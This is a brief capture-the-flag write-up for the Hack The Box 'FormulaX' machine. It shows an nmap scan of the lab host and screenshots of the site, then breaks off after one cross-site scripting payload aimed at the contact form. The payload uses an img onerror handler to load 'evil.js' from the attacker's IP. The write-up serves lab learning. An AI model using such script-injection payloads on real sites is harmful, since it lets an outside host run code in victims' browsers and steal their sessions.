# FormulaX Write-up

<img src="https://labs.hackthebox.com/storage/avatars/897faece9f60bf69d8e109833f63da48.png" width="200" height="200">

## Nmap

`nmap -sC -sV 10.10.11.6`

    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   256 5f:b2:cd:54:e4:47:d1:0e:9e:81:35:92:3c:d6:a3:cb (ECDSA)
    |_  256 b9:f0:0d:dc:05:7b:fa:fb:91:e6:d0:b4:59:e6:db:88 (ED25519)
    80/tcp open  http    nginx 1.18.0 (Ubuntu)
    |_http-server-header: nginx/1.18.0 (Ubuntu)
    |_http-cors: GET POST
    | http-title: Site doesn't have a title (text/html; charset=UTF-8).
    |_Requested resource was /static/index.html
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Main page 

![main page](https://github.com/zer00d4y/writeups/assets/128820441/3a3da767-6608-4a9c-adb9-1daa98b7adbd)

`Contact us` page 

![image](https://github.com/zer00d4y/writeups/assets/128820441/03f12159-e8aa-4ad2-be42-67d0b66cf0e3)

    <img SRC=p onerror="var script1 = document.createElement("script"); script1.src = 'http://10.10.14.91/evil.js'; document.head.appendChild(script1);" />

![image](https://github.com/zer00d4y/writeups/assets/128820441/dbb7cf44-9bf2-4cf7-b497-e22ad43b2c71)
